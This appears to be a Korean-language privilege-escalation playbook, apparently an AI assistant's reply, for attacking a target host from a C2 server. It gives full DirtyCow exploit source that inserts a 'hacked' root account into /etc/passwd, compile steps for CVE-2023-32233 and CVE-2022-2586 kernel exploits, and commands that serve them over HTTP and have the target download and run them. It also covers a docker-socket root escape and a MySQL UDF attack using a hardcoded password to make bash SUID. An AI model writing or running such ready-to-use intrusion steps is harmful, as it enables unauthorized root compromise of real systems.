# 지금 바로 실행할 해결책

## 문제 분석
- ✅ libmnl-dev 설치됨
- ❌ libnftnl-dev 아직 없음
- ❌ 타겟 glibc 2.34 (Looney Tunables는 2.35-2.38용)
- ❌ Git 인증 문제

---

## 🚀 즉시 해결 (C2 서버에서)

### 1단계: libnftnl-dev 설치

```bash
sudo apt-get install -y libnftnl-dev
```

### 2단계: CVE-2023-32233 컴파일

```bash
cd /tmp/CVE-2023-32233
gcc -o exploit exploit.c -lmnl -lnftnl -lpthread
ls -la exploit
```

**성공하면 다음:**

```bash
cd /tmp
python3 -m http.server 5000 &
echo "[+] Ready: http://13.158.67.78:5000/CVE-2023-32233/exploit"
```

---

## 🔄 대안: 다른 exploit들

### CVE-2023-4911은 작동 안함
타겟 glibc 2.34인데 이 CVE는 2.35-2.38용입니다.

### CVE-2022-2586 시도

```bash
cd /tmp
# Git 인증 없이 wget 사용
wget https://github.com/Markakd/CVE-2022-2586/archive/refs/heads/master.zip
unzip master.zip
cd CVE-2022-2586-master
gcc -o exploit exp.c -static -lpthread
```

### DirtyCow (CVE-2016-5195)

```bash
cd /tmp
cat > dirtycow.c << 'EOF'
/*
 * DirtyCow POC - CVE-2016-5195
 * Target: /etc/passwd
 */
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg) {
    int i, c = 0;
    for(i = 0; i < 200000000; i++) {
        c += madvise(map, 100, MADV_DONTNEED);
    }
    printf("[*] madvise %d\n", c);
    return NULL;
}

void *procselfmemThread(void *arg) {
    char *str = (char*)arg;
    int f = open("/proc/self/mem", O_RDWR);
    int i, c = 0;
    for(i = 0; i < 200000000; i++) {
        lseek(f, (off_t)map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
    printf("[*] /proc/self/mem %d\n", c);
    return NULL;
}

int main(int argc, char *argv[]) {
    printf("[*] DirtyCow - CVE-2016-5195\n");
    printf("[*] Target: /etc/passwd\n\n");

    pthread_t pth1, pth2;

    // Open /etc/passwd
    f = open("/etc/passwd", O_RDONLY);
    if(f < 0) {
        perror("open /etc/passwd");
        return 1;
    }

    fstat(f, &st);
    name = "/etc/passwd";

    // Create a private mapping
    map = mmap(NULL, st.st_size + 100, PROT_READ, MAP_PRIVATE, f, 0);
    if(map == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    printf("[*] mmap %p\n\n", map);
    printf("[*] Backing up /etc/passwd to /tmp/passwd.bak\n");
    system("cp /etc/passwd /tmp/passwd.bak");

    printf("[*] Exploiting...\n");
    printf("[*] This may take a few seconds...\n\n");

    // New root user entry
    char *new_root = "hacked:$1$hacked$9VV7zp9S9xp.VxP3.tRfA/:0:0:root:/root:/bin/bash\n";

    pthread_create(&pth1, NULL, madviseThread, NULL);
    pthread_create(&pth2, NULL, procselfmemThread, new_root);

    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    printf("\n[*] Done!\n");
    printf("[*] Check if exploit worked:\n");
    printf("    su hacked\n");
    printf("    Password: hacked\n");

    return 0;
}
EOF

gcc -o dirtycow dirtycow.c -pthread -static
ls -la dirtycow
```

---

## 📋 C2 서버에서 한번에 실행

```bash
# libnftnl 설치
sudo apt-get install -y libnftnl-dev

# CVE-2023-32233 컴파일
cd /tmp/CVE-2023-32233
gcc -o exploit exploit.c -lmnl -lnftnl -lpthread

# DirtyCow 백업 (위 코드 복사)
cd /tmp
# [위 dirtycow.c 코드 붙여넣기]
gcc -o dirtycow dirtycow.c -pthread -static

# HTTP 서버 시작
python3 -m http.server 5000 &

echo "[+] Exploits ready!"
ls -la /tmp/CVE-2023-32233/exploit /tmp/dirtycow
```

---

## 🎯 타겟에서 실행

### CVE-2023-32233 시도

```bash
cd /tmp
wget http://13.158.67.78:5000/CVE-2023-32233/exploit 2>/dev/null
chmod +x exploit
./exploit
whoami
```

### DirtyCow 시도 (실패시)

```bash
cd /tmp
wget http://13.158.67.78:5000/dirtycow 2>/dev/null
chmod +x dirtycow
./dirtycow
# 완료되면
su hacked
# 비밀번호: hacked
```

---

## ⚡ 가장 간단한 방법들

### 방법 1: Writable /etc/passwd 재확인

```bash
# 타겟에서
ls -la /etc/passwd
test -w /etc/passwd && echo "WRITABLE!" || echo "Not writable"
```

### 방법 2: Sudo 재확인

```bash
# 타겟에서
sudo -l
```

### 방법 3: Docker 소켓

```bash
# 타겟에서
ls -la /var/run/docker.sock
groups | grep docker
```

**docker 그룹이면:**

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### 방법 4: Capabilities 재확인

```bash
# 타겟에서
getcap -r / 2>/dev/null
```

---

## 🔍 다른 벡터들

### Cron Jobs

```bash
# 타겟에서
cat /etc/crontab
ls -la /etc/cron.d/
find /etc/cron* -writable -type f 2>/dev/null
```

### NFS Shares

```bash
# 타겟에서
cat /etc/exports
showmount -e localhost
```

### /tmp noexec 우회

```bash
# 타겟에서
mount | grep /tmp
# noexec이면 /dev/shm 사용
cd /dev/shm
```

---

## 💡 새로운 아이디어

### MySQL sys_exec() UDF

```bash
# 타겟에서
mysql -u webuser -p'WebPassw0rd!' vulnerable_sns

# MySQL에서
SELECT @@plugin_dir;
SELECT @@secure_file_priv;
SHOW VARIABLES LIKE 'secure%';
```

**만약 secure_file_priv가 비어있거나 /tmp이면:**

C2 서버에서 raptor_udf2.so 컴파일:

```bash
cd /tmp
wget https://www.exploit-db.com/download/1518 -O raptor_udf2.c
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# HTTP 서버로 제공
python3 -m http.server 5000 &
```

타겟에서:

```bash
cd /tmp
wget http://13.158.67.78:5000/raptor_udf2.so
chmod +x raptor_udf2.so

mysql -u webuser -p'WebPassw0rd!' vulnerable_sns << 'MYSQLEOF'
USE mysql;
CREATE TABLE IF NOT EXISTS udf_data (line blob);
INSERT INTO udf_data VALUES (LOAD_FILE('/tmp/raptor_udf2.so'));
SELECT * FROM udf_data INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
SELECT do_system('chmod u+s /bin/bash');
MYSQLEOF

# SUID bash 실행
/bin/bash -p
```

---

## 🚨 즉시 실행 순서

1. **C2 서버:**
```bash
sudo apt-get install -y libnftnl-dev
cd /tmp/CVE-2023-32233
gcc -o exploit exploit.c -lmnl -lnftnl -lpthread
cd /tmp
python3 -m http.server 5000 &
```

2. **타겟:**
```bash
cd /tmp
wget http://13.158.67.78:5000/CVE-2023-32233/exploit
chmod +x exploit
./exploit
```

3. **실패시 타겟에서:**
```bash
# 다시 전체 확인
sudo -l
test -w /etc/passwd && echo "WRITABLE!"
groups | grep docker
getcap -r /usr/bin 2>/dev/null
```

---

**가장 먼저: libnftnl-dev 설치 후 CVE-2023-32233 재컴파일!**
